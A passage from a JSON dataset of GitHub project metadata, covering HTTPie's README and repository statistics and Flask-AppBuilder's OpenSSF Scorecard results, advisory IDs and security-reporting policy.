Features\n\n- Expressive and intuitive syntax\n- Formatted and colorized terminal output\n- Built-in JSON support\n- Forms and file uploads\n- HTTPS, proxies, and authentication\n- Arbitrary request data\n- Custom headers\n- Persistent sessions\n- `wget`-like downloads\n\n[See all features →](https://httpie.io/docs)\n\n## Examples\n\nHello World:\n\n```bash\nhttps httpie.io/hello\n```\n\nCustom [HTTP method](https://httpie.io/docs#http-method), [HTTP headers](https://httpie.io/docs#http-headers) and [JSON](https://httpie.io/docs#json) data:\n\n```bash\nhttp PUT pie.dev/put X-API-Token:123 name=John\n```\n\nBuild and print a request without sending it using [offline mode](https://httpie.io/docs/cli/offline-mode):\n\n```bash\nhttp --offline pie.dev/post hello=offline\n```\n\nUse [GitHub API](https://developer.github.com/v3/issues/comments/#create-a-comment) to post a comment on an [Issue](https://github.com/httpie/cli/issues/83) with [authentication](https://httpie.io/docs#authentication):\n\n```bash\nhttp -a USERNAME POST https://api.github.com/repos/httpie/cli/issues/83/comments body='HTTPie is awesome! :heart:'\n```\n\n[See more examples →](https://httpie.io/docs#examples)\n\n## Community & support\n\n- Visit the [HTTPie website](https://httpie.io) for full documentation and useful links.\n- Join our [Discord server](https://httpie.io/discord) is to ask questions, discuss features, and for general API chat.\n- Tweet at [@httpie](https://twitter.com/httpie) on Twitter.\n- Use [StackOverflow](https://stackoverflow.com/questions/tagged/httpie) to ask questions and include a `httpie` tag.\n- Create [GitHub Issues](https://github.com/httpie/cli/issues) for bug reports and feature requests.\n- Subscribe to the [HTTPie newsletter](https://httpie.io) for occasional updates.\n\n## Contributing\n\nHave a look through existing [Issues](https://github.com/httpie/cli/issues) and [Pull Requests](https://github.com/httpie/cli/pulls) that you could help with. If you'd like to request a feature or report a bug, please [create a GitHub Issue](https://github.com/httpie/cli/issues) using one of the templates provided.\n\n[See contribution guide →](https://github.com/httpie/cli/blob/master/CONTRIBUTING.md)\n",
        "num_commits": 1787,
        "project_age_days": 4630,
        "project_created_at": "2012-02-25",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 149,
        "num_pull": 615,
        "num_issues": 1491,
        "num_opening_issue": 182,
        "project_size(kB)": 6898,
        "num_stargazers": 33780,
        "num_watchers": 33780,
        "num_forks": 3676,
        "num_subscribers": 85,
        "SecurityPolicy_created_at": "2022-03-07 20:29:48",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "59d9e928f8a6de4bd78e9e11adbabf9de9207d45",
                "url": "https://github.com/httpie/cli/commit/59d9e928f8a6de4bd78e9e11adbabf9de9207d45",
                "date": "2022-03-07 20:29:48"
            },
            {
                "commit_id": "0a873172c95404b43387c1a4302eecc1cdb8379e",
                "url": "https://github.com/httpie/cli/commit/0a873172c95404b43387c1a4302eecc1cdb8379e",
                "date": "2022-03-07 20:29:48"
            },
            {
                "commit_id": "395914fb4d439ce5220a44af231d3e16bf3fe18d",
                "url": "https://github.com/httpie/cli/commit/395914fb4d439ce5220a44af231d3e16bf3fe18d",
                "date": "2022-03-07 20:29:48"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "dpgaspar/flask-appbuilder",
        "project_url": "https://github.com/dpgaspar/flask-appbuilder",
        "SSF": {
            "date": "2024-10-29T20:56:17+07:00",
            "repo": {
                "name": "github.com/dpgaspar/flask-appbuilder",
                "commit": "fab9013003a41c4e80da04f072201a8c7cc99187"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.9,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "Found 9/27 approved changesets -- score normalized to 3",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: IOOSProfilingGliders contributor org/company found, DataJunction contributor org/company found, apache contributor org/company found, druid-io contributor org/company found, OpenLineage contributor org/company found, function contributor org/company found, astronomer contributor org/company found, preset-io contributor org/company found, preset-io @apache contributor org/company found, phriendlyinfo contributor org/company found, aosapps contributor org/company found, equifax contributor org/company found, government contributor org/company found, openstates contributor org/company found, srcbookdev contributor org/company found, cloudfoundry-community contributor org/company found, zenofdata contributor org/company found, pydap contributor org/company found, servicemesher contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 19 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "8 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 7",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:158: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:160: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:202: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:204: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:229: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yml:231: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ci.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/codeql-analysis.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ptlint.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/dpgaspar/Flask-AppBuilder/ptlint.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:130",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:131",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:132",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:133",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/ci.yml:139",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:179",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:180",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:181",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:182",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/ci.yml:189",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:211",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:212",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:213",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:214",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:215",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/ci.yml:221",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:238",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:239",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:240",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:241",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:242",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/ci.yml:248",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:27",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:28",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:79",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:80",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:81",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:82",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/ci.yml:88",
                        "Info:   0 out of  15 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   1 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  24 pipCommand dependencies pinned",
                        "Info:   0 out of   5 downloadThenRun dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 14 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 8,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: .github/SECURITY.md:1",
                        "Info: Found linked content: .github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: .github/SECURITY.md:1",
                        "Info: Found text in security policy: .github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:21",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:22",
                        "Warn: no topLevel permission defined: .github/workflows/ci.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ptlint.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-67hx-6x53-jw92",
                        "Warn: Project is vulnerable to: GHSA-6chw-6frg-f759",
                        "Warn: Project is vulnerable to: GHSA-v88g-cgmw-v5xw",
                        "Warn: Project is vulnerable to: GHSA-whgm-jr23-g3j9",
                        "Warn: Project is vulnerable to: GHSA-93q8-gq69-wqmw",
                        "Warn: Project is vulnerable to: GHSA-fwr7-v2mv-hh25",
                        "Warn: Project is vulnerable to: GHSA-4w2v-q235-vp99",
                        "Warn: Project is vulnerable to: GHSA-cph5-m8f7-6c5x",
                        "Warn: Project is vulnerable to: GHSA-wf5p-g6vw-rhxx",
                        "Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7",
                        "Warn: Project is vulnerable to: GHSA-vc8w-jr9v-vj7f",
                        "Warn: Project is vulnerable to: GHSA-cwfw-4gq5-mrqx",
                        "Warn: Project is vulnerable to: GHSA-g95f-p29q-9xw4",
                        "Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg",
                        "Warn: Project is vulnerable to: GHSA-x9w5-v3q2-3rhw",
                        "Warn: Project is vulnerable to: GHSA-w8qv-6jwh-64r5",
                        "Warn: Project is vulnerable to: GHSA-c6rq-rjc2-86v2",
                        "Warn: Project is vulnerable to: GHSA-257v-vj4p-3w2h",
                        "Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x",
                        "Warn: Project is vulnerable to: GHSA-gxpj-cx7g-858c",
                        "Warn: Project is vulnerable to: GHSA-w573-4hg7-7wgq",
                        "Warn: Project is vulnerable to: GHSA-3wcq-x3mq-6r9p",
                        "Warn: Project is vulnerable to: GHSA-ff7x-qrg7-qggm",
                        "Warn: Project is vulnerable to: GHSA-phwq-j96m-2c2q",
                        "Warn: Project is vulnerable to: GHSA-ghr5-ch3p-vcr6",
                        "Warn: Project is vulnerable to: GHSA-vh7m-p724-62c2",
                        "Warn: Project is vulnerable to: GHSA-r9p9-mrjm-926w",
                        "Warn: Project is vulnerable to: GHSA-434g-2637-qmqr",
                        "Warn: Project is vulnerable to: GHSA-49q7-c7j4-3p7m",
                        "Warn: Project is vulnerable to: GHSA-977x-g7h5-7qgw",
                        "Warn: Project is vulnerable to: GHSA-f7q4-pwc6-w24p",
                        "Warn: Project is vulnerable to: GHSA-fc9h-whq2-v747",
                        "Warn: Project is vulnerable to: GHSA-3gx7-xhv7-5mx3",
                        "Warn: Project is vulnerable to: GHSA-6h5x-7c5m-7cr7",
                        "Warn: Project is vulnerable to: GHSA-rv95-896h-c2vc",
                        "Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx",
                        "Warn: Project is vulnerable to: GHSA-74fj-2j2h-c42q",
                        "Warn: Project is vulnerable to: GHSA-pw2r-vq6v-hr8c",
                        "Warn: Project is vulnerable to: GHSA-jchw-25xp-jwwc",
                        "Warn: Project is vulnerable to: GHSA-cxjh-pqwp-8mfp",
                        "Warn: Project is vulnerable to: GHSA-8r6j-v8pm-fqw3",
                        "Warn: Project is vulnerable to: MAL-2023-462",
                        "Warn: Project is vulnerable to: GHSA-w457-6q6x-cgp9",
                        "Warn: Project is vulnerable to: GHSA-62gr-4qp9-h98f",
                        "Warn: Project is vulnerable to: GHSA-f52g-6jhx-586p",
                        "Warn: Project is vulnerable to: GHSA-2cf5-4w76-r9qv",
                        "Warn: Project is vulnerable to: GHSA-3cqr-58rm-57f8",
                        "Warn: Project is vulnerable to: GHSA-g9r4-xpmj-mj65",
                        "Warn: Project is vulnerable to: GHSA-q2c6-c6pm-g3gh",
                        "Warn: Project is vulnerable to: GHSA-765h-qjxv-5f44",
                        "Warn: Project is vulnerable to: GHSA-f2jv-r9rf-7988",
                        "Warn: Project is vulnerable to: GHSA-c429-5p7v-vgjp",
                        "Warn: Project is vulnerable to: GHSA-43f8-2h32-f4cj",
                        "Warn: Project is vulnerable to: GHSA-pfq8-rq6v-vf5m",
                        "Warn: Project is vulnerable to: GHSA-6x33-pw7p-hmpq",
                        "Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27",
                        "Warn: Project is vulnerable to: GHSA-qqgx-2p2h-9c37",
                        "Warn: Project is vulnerable to: GHSA-78xj-cgh5-2h22",
                        "Warn: Project is vulnerable to: GHSA-2p57-rm9w-gvfp",
                        "Warn: Project is vulnerable to: GHSA-7r28-3m3f-r2pr",
                        "Warn: Project is vulnerable to: GHSA-r8j5-h5cx-65gg",
                        "Warn: Project is vulnerable to: GHSA-6c3j-c64m-qhgq",
                        "Warn: Project is vulnerable to: GHSA-gxr4-xjj5-5px2",
                        "Warn: Project is vulnerable to: GHSA-jpcq-cgw6-v4j6",
                        "Warn: Project is vulnerable to: GHSA-896r-f27r-55mw",
                        "Warn: Project is vulnerable to: GHSA-9c47-m6qq-7p4h",
                        "Warn: Project is vulnerable to: GHSA-6c8f-qphg-qjgp",
                        "Warn: Project is vulnerable to: GHSA-76p3-8jx3-jpfq",
                        "Warn: Project is vulnerable to: GHSA-3rfm-jhwj-7488",
                        "Warn: Project is vulnerable to: GHSA-hhq3-ff78-jv3g",
                        "Warn: Project is vulnerable to: GHSA-p6mc-m468-83gw",
                        "Warn: Project is vulnerable to: GHSA-29mw-wpgm-hmr9",
                        "Warn: Project is vulnerable to: GHSA-35jh-r3h4-6jhm",
                        "Warn: Project is vulnerable to: GHSA-4xcv-9jjx-gfj3",
                        "Warn: Project is vulnerable to: GHSA-7wpw-2hjm-89gp",
                        "Warn: Project is vulnerable to: GHSA-r6rj-9ch6-g264",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv",
                        "Warn: Project is vulnerable to: GHSA-f8q6-p94x-37v3",
                        "Warn: Project is vulnerable to: GHSA-vh95-rmgr-6w4m / GHSA-xvch-5gv4-984h",
                        "Warn: Project is vulnerable to: GHSA-92xj-mqp7-vmcj",
                        "Warn: Project is vulnerable to: GHSA-wxgw-qj99-44c2",
                        "Warn: Project is vulnerable to: GHSA-5rrq-pxf6-6jx5",
                        "Warn: Project is vulnerable to: GHSA-8fr3-hfg3-gpgp",
                        "Warn: Project is vulnerable to: GHSA-gf8q-jrpm-jvxq",
                        "Warn: Project is vulnerable to: GHSA-2r2c-g63r-vccr",
                        "Warn: Project is vulnerable to: GHSA-cfm4-qjh2-4765",
                        "Warn: Project is vulnerable to: GHSA-x4jg-mjrx-434g",
                        "Warn: Project is vulnerable to: GHSA-5fw9-fq32-wv5p",
                        "Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr",
                        "Warn: Project is vulnerable to: GHSA-hj48-42vr-x3v9",
                        "Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j",
                        "Warn: Project is vulnerable to: GHSA-566m-qj78-rww5",
                        "Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j",
                        "Warn: Project is vulnerable to: GHSA-hwj9-h5mp-3pm3",
                        "Warn: Project is vulnerable to: GHSA-hrpp-h998-j3pp",
                        "Warn: Project is vulnerable to: GHSA-5q6m-3h65-w53x",
                        "Warn: Project is vulnerable to: GHSA-p8p7-x288-28g6",
                        "Warn: Project is vulnerable to: GHSA-c2qf-rxjj-qqgw",
                        "Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg",
                        "Warn: Project is vulnerable to: GHSA-h9rv-jmmf-4pgx",
                        "Warn: Project is vulnerable to: GHSA-hxcc-f52p-wc94",
                        "Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p",
                        "Warn: Project is vulnerable to: GHSA-g4rg-993r-mgx7",
                        "Warn: Project is vulnerable to: GHSA-c9g6-9335-x697",
                        "Warn: Project is vulnerable to: GHSA-vx3p-948g-6vhq",
                        "Warn: Project is vulnerable to: GHSA-j44m-qm6p-hp7m",
                        "Warn: Project is vulnerable to: GHSA-3jfq-g458-7qm9",
                        "Warn: Project is vulnerable to: GHSA-r628-mhmh-qjhw",
                        "Warn: Project is vulnerable to: GHSA-9r2w-394v-53qc",
                        "Warn: Project is vulnerable to: GHSA-5955-9wpr-37jh",
                        "Warn: Project is vulnerable to: GHSA-qq89-hq3f-393p",
                        "Warn: Project is vulnerable to: GHSA-f5x3-32g6-xq36",
                        "Warn: Project is vulnerable to: GHSA-4wf5-vphf-c2xc",
                        "Warn: Project is vulnerable to: GHSA-jgrx-mgxx-jf9v",
                        "Warn: Project is vulnerable to: GHSA-72xf-g2v4-qvf3",
                        "Warn: Project is vulnerable to: GHSA-cf4h-3jhx-xvhq",
                        "Warn: Project is vulnerable to: GHSA-9m6j-fcg5-2442",
                        "Warn: Project is vulnerable to: GHSA-hh27-ffr2-f2jc",
                        "Warn: Project is vulnerable to: GHSA-rqff-837h-mm52",
                        "Warn: Project is vulnerable to: GHSA-8v38-pw62-9cw2",
                        "Warn: Project is vulnerable to: GHSA-hgjh-723h-mx2j",
                        "Warn: Project is vulnerable to: GHSA-jf5r-8hm2-f872",
                        "Warn: Project is vulnerable to: GHSA-wr3j-pwj9-hqq6",
                        "Warn: Project is vulnerable to: GHSA-g78m-2chm-r7qv",
                        "Warn: Project is vulnerable to: GHSA-6fc8-4gx4-v693",
                        "Warn: Project is vulnerable to: GHSA-3h5v-q93c-6h6q",
                        "Warn: Project is vulnerable to: GHSA-c4w7-xm78-47vh",
                        "Warn: Project is vulnerable to: GHSA-p9pc-299p-vxgp",
                        "Warn: Project is vulnerable to: GHSA-9mvj-f7w8-pvh2"
                    ],
                    "score": 0,
                    "reason": "129 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/dpgaspar/flask-appbuilder/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Reporting Vulnerabilities\n\n**⚠️ Please do not file GitHub issues for security vulnerabilities as they are public! ⚠️**\n\nIf you have any concern or believe you have found a vulnerability in Flask-AppBuilder,\nplease get in touch privately at\ne-mail address [danielvazgaspar@gmail.com](mailto:danielvazgaspar@gmail.com).\n\nWe kindly ask you to include the following information in your report:\n- Output from `pip freeze`\n- Detailed steps to reproduce the vulnerability\n",
        "project_all_labels": [
            "api",
            "breaking-change",
            "bug",
            "closed-automatically",
            "dependency-bump",
            "deployment",
            "discussion-needed",
            "docs",
            "duplicate",
            "enhancement",
            "github_actions",
            "Help-Needed",
            "install",
            "invalid",
            "javascript",
            "mongo",
            "more-information-needed",
            "mvc",
            "pending",
            "python",
            "question",
            "security:auth",
            "security:crud",
            "security:permission",
            "stale",
            "urgent",
            "wontfix"
        ],
        "README_content": "Flask App Builder\n=================\n\n.. image:: https://github.com/dpgaspar/Flask-AppBuilder/workflows/Python/badge.svg\n        :target: https://github.com/dpgaspar/Flask-AppBuilder/actions\n\n.. image:: https://img.shields.io/pypi/v/Flask-AppBuilder.svg\n        :alt: PyPI\n        :target: https://pypi.org/project/Flask-AppBuilder/\n\n.. image:: https://img.shields.io/badge/pyversions-3.8%2C%203.9%2C%203.10%2C%203.11%2C%203.12-blue.svg\n        :target: https://www.python.org/\n\n.. image:: https://codecov.io/github/dpgaspar/Flask-AppBuilder/coverage.svg?branch=master\n        :target: https://codecov.io/github/dpgaspar/Flask-AppBuilder\n\n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n    :target: https://github.com/psf/black\n\n\nSimple and rapid application development framework, built on top of `Flask <http://flask.pocoo.org/>`_.\nincludes detailed security, auto CRUD generation for your models, google charts and much more.\n\nExtensive configuration of all functionality, easily integrate with normal Flask/Jinja2 development.\n\n- Documentation: `Documentation <http://flask-appbuilder.readthedocs.org/en/latest/>`_\n\n- Mailing list: `Google group <https://groups.google.com/forum/#!forum/flask-appbuilder>`_\n\n- Chat: `Gitter <https://gitter.im/dpgaspar/Flask-AppBuilder>`_\n\n- Examples: `examples <https://github.com/dpgaspar/Flask-AppBuilder/tree/master/examples>`_\n\nCheckout installation video on `YouTube <http://youtu.be/xvum4vfwldg>`_\n\nQuick how to `Demo from the docs <http://flaskappbuilder.pythonanywhere.com/>`_ (login has guest/welcome).\n\nChange Log\n----------\n\n`Versions <https://github.com/dpgaspar/Flask-AppBuilder/tree/master/CHANGELOG.rst>`_ for further detail on what changed.\n\nFixes, Bugs and contributions\n-----------------------------\n\nYou're welcome to report bugs, 